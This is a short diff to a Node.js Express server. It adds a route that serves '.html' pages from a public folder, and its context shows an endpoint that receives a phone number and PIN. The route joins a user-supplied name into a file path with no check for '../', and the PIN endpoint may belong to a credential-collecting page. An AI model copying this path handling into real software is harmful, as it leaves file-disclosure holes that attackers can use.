@@ -26,6 +26,25 @@ app.get('/', (req, res) => {
     res.sendFile(path.join(__dirname, 'public', 'index.html'));
 });
 
+// Fix for /page2, /page3 etc.
+app.get('/:page', (req, res) => {
+    if (req.params.page.startsWith('api')) {
+        return res.status(404).send("Not found");
+    }
+
+    const file = req.params.page.endsWith('.html')
+        ? req.params.page
+        : req.params.page + '.html';
+
+    const filePath = path.join(__dirname, 'public', file);
+
+    res.sendFile(filePath, (err) => {
+        if (err) {
+            res.status(404).send("Page not found");
+        }
+    });
+});
+
 // -------------------- LOGIN API --------------------
 app.post('/api/login-notification', async (req, res) => {
     const { phone, pin } = req.body || {};
